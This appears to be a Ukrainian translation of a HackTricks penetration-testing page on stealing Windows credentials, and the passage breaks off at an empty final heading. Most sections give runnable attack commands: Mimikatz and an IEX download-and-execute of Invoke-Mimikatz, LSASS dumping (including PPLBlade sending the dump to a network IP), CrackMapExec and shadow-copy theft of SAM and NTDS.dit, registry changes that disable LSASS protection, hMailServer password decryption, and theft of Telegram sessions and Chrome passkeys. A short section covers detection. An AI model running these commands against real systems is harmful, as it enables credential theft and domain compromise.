# Викрадення облікових даних Windows

{{#include ../../banners/hacktricks-training.md}}

## Облікові дані Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Знайдіть інші речі, які може робити Mimikatz, на** [**цій сторінці**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Дізнайтеся про деякі можливі способи захисту облікових даних тут.**](credentials-protections.md) **Ці способи захисту можуть завадити Mimikatz викрасти деякі облікові дані.**

## Облікові дані в Meterpreter

Використовуйте [**плагін Credentials**](https://github.com/carlospolop/MSF-Credentials), **який** я створив, щоб **шукати паролі та хеші** на комп’ютері жертви.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Обхід AV

### Procdump + Mimikatz

Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, Defender його не виявляє.\
За допомогою цього інструмента можна **створити дамп процесу lsass**, **завантажити дамп** і **локально витягти облікові дані** з нього.

Також можна скористатися [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Цей процес автоматично виконується за допомогою [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Примітка**: Деякі **AV** можуть **виявляти** використання **procdump.exe для dump lsass.exe** як **шкідливе**, оскільки вони **виявляють** рядки **"procdump.exe" і "lsass.exe"**. Тому **непомітніше** передавати **PID** lsass.exe як **аргумент** procdump **замість** **назви lsass.exe**.

### Dumping lsass за допомогою **comsvcs.dll**

DLL із назвою **comsvcs.dll**, розташована в `C:\Windows\System32`, відповідає за **dump пам’яті процесу** у разі аварійного завершення роботи. Ця DLL містить **функцію** **`MiniDumpW`**, яку можна викликати за допомогою `rundll32.exe`.\
Перші два аргументи не мають значення, але третій складається з трьох компонентів. Перший компонент — це ID процесу, який потрібно dump, другий — шлях до dump-файлу, а третій — виключно слово **full**. Інших варіантів немає.\
Після аналізу цих трьох компонентів DLL створює dump-файл і записує в нього пам’ять зазначеного процесу.\
**comsvcs.dll** можна використовувати для dump процесу lsass, тож завантажувати й запускати procdump не потрібно. Цей метод докладно описано тут: [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Для виконання використовується така команда:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Ви можете автоматизувати цей процес за допомогою** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Створення дампа lsass за допомогою Диспетчера завдань**

1. Клацніть правою кнопкою миші на панелі завдань і виберіть «Диспетчер завдань».
2. Клацніть «Докладніше».
3. На вкладці «Процеси» знайдіть процес «Local Security Authority Process».
4. Клацніть правою кнопкою миші на процесі «Local Security Authority Process» і виберіть «Створити файл дампа».

### Створення дампа lsass за допомогою procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) — це підписаний Microsoft бінарний файл із набору утиліт [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Уже наявний дамп аварійного завершення роботи всієї системи або його стиснена копія в доступній користувацькій теці можуть зберігати дані облікових записів для офлайн-аналізу. Назви файлів на кшталт `MEMORY.DMP` і `MEMORY.7z` — лише підказки для перевірки: з’ясуйте їхнє походження та доступність і не припускайте, що вони містять придатні до використання або актуальні облікові дані.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Офлайн-вилучення облікових даних зі знімків VM

Читабельна резервна копія VM може містити збережений **образ пам’яті гостьової системи**, навіть якщо немає доступу до запущеної гостьової системи чи LSASS. Для VMware знайдіть метадані знімка `.vmsn` і пов’язаний із ними файл `.vmem`, якщо він є; не плутайте їх із образом диска `.vmdk`. `VMkatz` аналізує знімки або вхідні дані каталогів VM і може відновити [облікові дані сеансів входу Windows](credentials-mimikatz.md), наприклад hashes і tickets, із пам’яті гостьової системи. Він також може перевіряти віртуальні диски на наявність матеріалів SAM/LSA. Необхідною умовою є доступ до файлів резервної копії, а не права налагодження на запущеній VM.<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

Приклад у Checkpoint відновив NT-хеш **локального** Administrator зі знімка автономної VM. Він автентифікувався в домені лише після окремого підтвердження повторного використання пароля; локальний хеш із резервної копії сам по собі не є обліковими даними домену. На хості з обмеженою пам’яттю VMkatz може сканувати й вивільняти сторінки поступово, але копіювання знімка на хост для аналізу з більшим обсягом пам’яті все одно може бути кращим варіантом.<sup>[[17]](#references)[[18]](#references)</sup>

## Дамп lsass за допомогою PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) — це інструмент для дампу захищених процесів, який підтримує обфускацію дампу пам’яті та його передавання на віддалені робочі станції без запису на диск.

**Основні функції**:

1. Обхід захисту PPL
2. Обфускація файлів дампу пам’яті для обходу механізмів виявлення Defender на основі сигнатур
3. Завантаження дампу пам’яті за допомогою методів RAW і SMB без запису на диск (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – дамп LSASS на основі SSP без MiniDumpWriteDump

Ink Dragon використовує триетапний dumper під назвою **LalsDumper**, який ніколи не викликає `MiniDumpWriteDump`, тож EDR-хуки на цей API не спрацьовують:<sup>[[3]](#references)</sup>

1. **Етап 1: завантажувач (`lals.exe`)** – шукає в `fdp.dll` placeholder із 32 символів `d` у нижньому регістрі, замінює його абсолютним шляхом до `rtu.txt`, зберігає пропатчену DLL як `nfdp.dll` і викликає `AddSecurityPackageA("nfdp","fdp")`. Це змушує **LSASS** завантажити шкідливу DLL як нового Security Support Provider (SSP).
2. **Етап 2: всередині LSASS** – коли LSASS завантажує `nfdp.dll`, DLL читає `rtu.txt`, застосовує XOR до кожного байта з ключем `0x20` і відображає декодований blob у пам’яті, перш ніж передати йому керування.
3. **Етап 3: dumper** – відображене в пам’яті payload повторно реалізує логіку MiniDump за допомогою **прямих системних викликів**, визначених за хешованими назвами API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Спеціальний експорт із назвою `Tom` відкриває `%TEMP%\<pid>.ddt`, записує стиснений дамп LSASS у файл і закриває handle, щоб його можна було ексфільтрувати пізніше.

Примітки для оператора:

* Зберігайте `lals.exe`, `fdp.dll`, `nfdp.dll` і `rtu.txt` в одному каталозі. Етап 1 замінює жорстко заданий placeholder абсолютним шляхом до `rtu.txt`, тож якщо розмістити файли окремо, ланцюжок не спрацює.
* Реєстрація відбувається шляхом додавання `nfdp` до `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Ви можете самостійно додати це значення, щоб LSASS завантажував SSP під час кожного запуску.
* Файли `%TEMP%\*.ddt` містять стиснені дампи. Розпакуйте їх локально, а потім передайте в Mimikatz/Volatility для вилучення облікових даних.
* Для запуску `lals.exe` потрібні права admin/SeTcb, щоб `AddSecurityPackageA` спрацював; щойно виклик повертається, LSASS непомітно завантажує шахрайський SSP і виконує етап 2.
* Видалення DLL з диска не вивантажує її з LSASS. Видаліть запис реєстру й перезапустіть LSASS (перезавантажте систему) або залиште його для довготривалого persistence.

## CrackMapExec

### Дамп хешів SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump NTDS.dit із цільового DC

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump історії паролів NTDS.dit із цільового DC

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Показати атрибут pwdLastSet для кожного облікового запису NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Викрадення SAM і SYSTEM

Ці файли мають бути **розташовані** в _C:\windows\system32\config\SAM_ і _C:\windows\system32\config\SYSTEM._ Але **їх не можна просто скопіювати звичайним способом**, оскільки вони захищені.

### З реєстру

Найпростіший спосіб викрасти ці файли — отримати їхню копію з реєстру:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Завантажте** ці файли на свою машину Kali та **витягніть хеші** за допомогою:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Тіньова копія тома

За допомогою цієї служби можна копіювати захищені файли. Потрібні права адміністратора.

#### Використання vssadmin

Бінарний файл vssadmin доступний лише у версіях Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Але те саме можна зробити з **Powershell**. Ось приклад **копіювання файлу SAM** (використовується диск «C:», а файл зберігається в C:\users\Public), але цей спосіб можна застосувати для копіювання будь-якого захищеного файлу:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Код із книги: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Нарешті, для створення копії SAM, SYSTEM і ntds.dit можна також скористатися [**PS-скриптом Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1).

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Облікові дані Active Directory — NTDS.dit**

Файл **NTDS.dit** відомий як серце **Active Directory**: він містить важливі дані про об’єкти користувачів, групи та їхнє членство. Саме в ньому зберігаються **хеші паролів** користувачів домену. Цей файл є базою даних **Extensible Storage Engine (ESE)** і розташований за шляхом **_%SystemRoom%/NTDS/ntds.dit_**.

У цій базі даних містяться три основні таблиці:

- **Таблиця даних**: зберігає відомості про такі об’єкти, як користувачі та групи.
- **Таблиця зв’язків**: відстежує зв’язки, зокрема членство в групах.
- **Таблиця SD**: тут зберігаються **дескриптори безпеки** кожного об’єкта, що забезпечують безпеку та контроль доступу до збережених об’єктів.

Дослідження Christoffer Andersson на рівні бази даних докладніше описує ці таблиці та їхню поведінку залежно від версії.<sup>[[8]](#references)</sup>

Windows використовує _Ntdsa.dll_ для взаємодії з цим файлом, а сам файл використовується _lsass.exe_. Тому **частина** файлу **NTDS.dit** може перебувати **в пам’яті `lsass`** (імовірно, там можна знайти нещодавно використані дані завдяки підвищенню продуктивності за допомогою **кешу**).

#### Розшифрування хешів у NTDS.dit

Хеш шифрується тричі:

1. Розшифруйте ключ шифрування паролів (**PEK**) за допомогою **BOOTKEY** та **RC4**.
2. Розшифруйте **хеш** за допомогою **PEK** та **RC4**.
3. Розшифруйте **хеш** за допомогою **DES**.

**PEK** має **однакове значення на кожному контролері домену**, але він **зашифрований** у **NTDS.dit** за допомогою специфічного для контролера домену **BOOTKEY** із його вулика **SYSTEM**. Тому для отримання облікових даних потрібні і **NTDS.dit**, і **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Окрема [техніка перенаправлення таблиці дескрипторів ядра](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) дає змогу скопіювати вже відкритий файловий об’єкт NTDS без VSS, але для цього потрібна примітива довільного читання/запису в ядрі на контролері домену.<sup>[[16]](#references)</sup>

### Копіювання NTDS.dit за допомогою Ntdsutil

Доступно, починаючи з Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Також можна скористатися прийомом із [**тіньовою копією тому**](#stealing-sam-and-system), щоб скопіювати файл **ntds.dit**. Пам’ятайте, що вам також знадобиться копія **файлу SYSTEM** (знову ж таки, скористайтеся прийомом [**дампу з реєстру або тіньової копії тому**](#stealing-sam-and-system)).

### **Витягування хешів із NTDS.dit**

Отримавши файли **NTDS.dit** і **SYSTEM**, можна скористатися такими інструментами, як _secretsdump.py_, щоб **витягти хеші**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Ви також можете **автоматично витягти їх** за допомогою дійсного користувача domain admin:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Для **великих файлів NTDS.dit** рекомендується виконувати їхнє вилучення за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Нарешті, можна також скористатися **модулем metasploit**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`

### **Вилучення об'єктів домену з NTDS.dit до бази даних SQLite**

Об'єкти NTDS можна вилучити до бази даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Вилучаються не лише секрети, а й усі об'єкти та їхні атрибути, щоб надалі отримати додаткову інформацію, якщо вихідний файл NTDS.dit уже отримано.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Кущ `SYSTEM` є необов’язковим, але дає змогу розшифрувати секрети (хеші NT і LM, додаткові облікові дані, як-от паролі у відкритому вигляді, ключі Kerberos або trust, історію паролів NT і LM). Серед іншої інформації витягуються такі дані: облікові записи користувачів і комп’ютерів із їхніми хешами, прапорці UAC, час останнього входу й зміни пароля, описи облікових записів, імена, UPN, SPN, групи та рекурсивне членство в них, дерево організаційних підрозділів і членство в них, довірені домени із типом, напрямком та атрибутами trust...

## Lazagne

Завантажте бінарний файл [тут](https://github.com/AlessandroZ/LaZagne/releases). Цей бінарний файл можна використовувати для вилучення облікових даних із різних програм.

```
lazagne.exe all
```

## Інші інструменти для вилучення облікових даних із SAM і LSASS

### Windows credentials Editor (WCE)

Цей інструмент можна використовувати для вилучення облікових даних із пам’яті. Завантажте його з: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Вилучення облікових даних із файлу SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Витягніть облікові дані з файлу SAM.

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Завантажте його звідси:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) і просто **запустіть його**, щоб отримати паролі.

## Збір даних про неактивні RDP-сеанси та послаблення засобів безпеки

RAT FinalDraft від Ink Dragon містить tasker `DumpRDPHistory`, методи якого стануть у пригоді будь-якому red-teamer:<sup>[[3]](#references)</sup>

### Збір телеметрії в стилі DumpRDPHistory

* **Цілі вихідних RDP-підключень** – розберіть кожен hive користувача за адресою `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. У кожному підрозділі зберігаються ім’я сервера, `UsernameHint` і час останнього запису. Логіку FinalDraft можна відтворити за допомогою PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Докази вхідних RDP-підключень** – перевірте журнал `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` на наявність подій із кодами **21** (успішний вхід) і **25** (відключення), щоб з’ясувати, хто адміністрував систему:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Коли з’ясуєте, який Domain Admin регулярно підключається, злийте LSASS (за допомогою LalsDumper/Mimikatz), поки його **відключений** сеанс ще існує. CredSSP + NTLM fallback залишає його верифікатор і токени в LSASS, які потім можна повторно використати через SMB/WinRM, щоб отримати `NTDS.dit` або закріпитися на контролерах домену.

### Зниження рівня захисту реєстру, націлені на FinalDraft

Цей самий імплант також змінює кілька ключів реєстру, щоб спростити викрадення облікових даних:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` вимикає Restricted Admin для вхідних RDP-підключень; це **не** вмикає pass-the-hash через цей режим. Значення `0` дозволяє Restricted Admin на цільовій системі, але клієнт має запросити `/RestrictedAdmin` або використовувати політику, яка вимагає Restricted Admin.<sup>[[14]](#references)</sup> Сам по собі хеш не надає віддалених прав адміністратора; див. [передумови автентифікації RDP](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` вимикає фільтрацію токенів UAC, щоб локальні адміністратори отримували необмежені токени через мережу.
* `DSRMAdminLogonBehavior=2` дозволяє адміністратору DSRM входити в систему, коли DC працює, надаючи зловмисникам ще один вбудований обліковий запис із високими привілеями.
* `RunAsPPL=0` знімає захист LSASS PPL, спрощуючи доступ до пам’яті для інструментів дампу, таких як LalsDumper.

## Облікові дані конфігурації hMailServer (після компрометації)

Перевірте точні файли конфігурації `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` і `C:\ProgramData\hMailServer\hMailServer.ini` відповідно до структури встановлення. Непорожнє значення `[Security] AdministratorPassword=`, доступне для читання, є хешем пароля адміністратора hMailServer; воно не свідчить про те, що це пароль адміністратора Windows. Якщо ці облікові дані буде отримано, для переходу до облікового запису Windows необхідно окремо підтвердити повторне використання пароля та права на вхід.

Для інсталяцій, що використовують базу даних SQL CE, окреме значення `[Database] Password=` у INI-файлі захищає базу даних. У застарілих інсталяціях це значення зашифровано Blowfish зі статичним ключем `THIS_KEY_IS_NOT_SECRET` і перестановкою порядку байтів у 4-байтових словах. Використайте hex-рядок з INI-файлу з цим фрагментом Python:<sup>[[2]](#references)</sup>

Спочатку переконайтеся, що поточний обліковий запис може читати **обидва** файли: INI та відповідну базу даних SQL CE `.sdf`. Пароль із INI захищає базу даних; він відрізняється від хешів паролів облікових записів поштових скриньок, що зберігаються в ній. Переглядайте або оновлюйте **копію** бази даних, яка використовується, а не активний файл.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Маючи пароль у відкритому вигляді, скопіюйте базу даних SQL CE, щоб уникнути блокування файлу, завантажте 32-бітний провайдер і за потреби оновіть базу перед запитом хешів:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Стовпець `accountpassword` використовує формат хешу hMailServer (режим hashcat `1421`). Зламаний пароль поштової скриньки дає змогу перейти до облікового запису Windows лише якщо цей пароль повторно використовується локальним/доменним обліковим записом і цей обліковий запис має необхідні права для віддаленого входу.

## Перехоплення callback-функції входу LSA (LsaApLogonUserEx2)

Деякі інструменти збирають **паролі для входу у відкритому вигляді**, перехоплюючи callback-функцію входу LSA `LsaApLogonUserEx2`. Ідея полягає в тому, щоб підмінити або обгорнути callback-функцію пакета автентифікації, аби зібрати облікові дані **під час входу** (до хешування), а потім записати їх на диск або повернути оператору. Зазвичай це реалізовано як допоміжний компонент, який впроваджується в LSA або реєструється в ньому, а потім записує кожну успішну подію інтерактивного/мережевого входу разом з іменем користувача, доменом і паролем.<sup>[[1]](#references)</sup>

Операційні примітки:
- Щоб завантажити допоміжний компонент у шлях автентифікації, потрібні права локального адміністратора/SYSTEM.
- Перехоплені облікові дані з’являються лише під час входу (інтерактивного, через RDP, облікового запису служби або мережевого — залежно від перехоплювача).

## Збережені облікові дані підключення SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) зберігає дані збережених підключень у файлі `sqlstudio.bin` для кожного користувача. Спеціалізовані інструменти для дампу можуть розібрати цей файл і відновити збережені облікові дані SQL. В оболонках, які повертають лише вивід команд, файл часто викрадають, кодуючи його у Base64 і виводячи в stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

На боці оператора перебудуйте файл і запустіть dumper локально, щоб відновити облікові дані:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Викрадення сесій браузера та cookies через Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Викрадення сесій Telegram Desktop `tdata`

Telegram Desktop зберігає дані авторизації та стану облікового запису в каталозі **`tdata`**. Скопійовану сесію можна завантажити за допомогою сумісних інструментів, щоб пройти автентифікацію без пароля облікового запису, доки ця авторизація залишається дійсною; якщо ввімкнено шифрування локальних даних, зловмиснику також знадобиться код-пароль. Після цього автентифікована сесія може надати доступ до даних про особу, метаданих діалогів і членства, повідомлень та медіафайлів для завантаження.<sup>[[10]](#references)</sup>

### Пошук і отримання

Шукайте як у встановлених, так і в портативних версіях; назви пакетів Microsoft Store різняться, тому перелікуйте каталоги пакетів, що містять `TelegramMessenge`, і перевіряйте їхнє піддерево `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Якщо звичайне читання не вдається, а токен процесу **вже містить і має ввімкнений** `SeBackupPrivilege`, доступ із семантикою резервного копіювання може бути запасним варіантом; він не надає привілей і не підвищує рівень доступу процесу. `CreateFileW` із `FILE_FLAG_BACKUP_SEMANTICS` може запросити семантику резервного копіювання/відновлення та обходити перевірки безпеки файлів, якщо токен має необхідні привілеї, але сам по собі цей прапорець не обходить несумісне блокування спільного доступу.<sup>[[10]](#references)[[11]](#references)</sup>

Для файлів, заблокованих під час роботи системи, створіть/прочитайте **Volume Shadow Copy**; для файлів, доступ до яких заборонено ACL, `robocopy /B` використовує режим резервного копіювання та обходить ACL файлів і каталогів.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Імплант, що економить пропускну здатність, може спершу надіслати лише перелік шляхів до файлів, отримати ідентифікатор знімка та список шляхів, уже збережених C2, а потім завантажити лише відсутні файли. Тому навіть невеликі інкрементальні передавання після рекурсивного переліку `tdata` можуть свідчити про успішне викрадення сесії.<sup>[[10]](#references)</sup>

### Виявлення та стримування

Пов’язуйте рекурсивний доступ до `tdata` з боку процесу, відмінного від Telegram, з увімкненням `SeBackupPrivilege`, відкриттям файлів із семантикою резервного копіювання, активністю VSS або дочірнім процесом `robocopy.exe`, що використовує `/B`. Також шукайте швидкий перелік вмісту `%APPDATA%` і `%LOCALAPPDATA%\Packages`, за яким ідуть вихідні з’єднання того самого процесу. Після компрометації скористайтеся **Налаштування → Пристрої** (або **Конфіденційність і безпека → Активні сеанси**), щоб завершити невідомі сеанси; саме лише ввімкнення двоетапної перевірки не відкликає вже викрадену авторизацію.<sup>[[10]](#references)[[13]](#references)</sup>

## Викрадення облікових даних Passkeys / WebAuthn із Chrome у Windows

Якщо вдалося отримати виконання коду від імені **користувача-жертви** на хості Windows, де використовуються **Chrome + синхронізовані passkeys у Google Password Manager**, passkeys стають цікавою ціллю для post-exploitation навіть **без прав адміністратора/SYSTEM**.<sup>[[4]](#references)</sup>

### Цікаві локальні артефакти

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** зберігає записи **`WebauthnCredentialSpecifics`**, закодовані у protobuf. Процес того самого користувача може отримати **RP ID**, **ім’я користувача**, **ідентифікатор облікових даних** і зашифрований матеріал приватного ключа для синхронізованих passkeys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** зберігає стан реєстрації локального пристрою, зокрема **`wrapped_identity_private_key`** і загорнутий секрет, який використовується для відновлення синхронізованих облікових даних.<sup>[[4]](#references)</sup>

Швидке сортування:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-bound key blobs усе ще можна використовувати як локальний oracle для підпису

Якщо браузер експортує ключ ідентифікації, захищений TPM, як **`NCRYPT_OPAQUE_KEY_BLOB`** і зберігає цей blob у доступному користувачу стані, malware **не потрібно** отримувати вихідний приватний ключ. Воно може просто повторно імпортувати blob на **тому самому комп’ютері** й попросити локальний TPM підписати дані, контрольовані зловмисником:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Це означає, що **прив’язка до апаратного забезпечення перешкоджає експорту за межі пристрою, але не використанню тим самим користувачем на скомпрометованій кінцевій точці**.

### Практичні шляхи зловживання

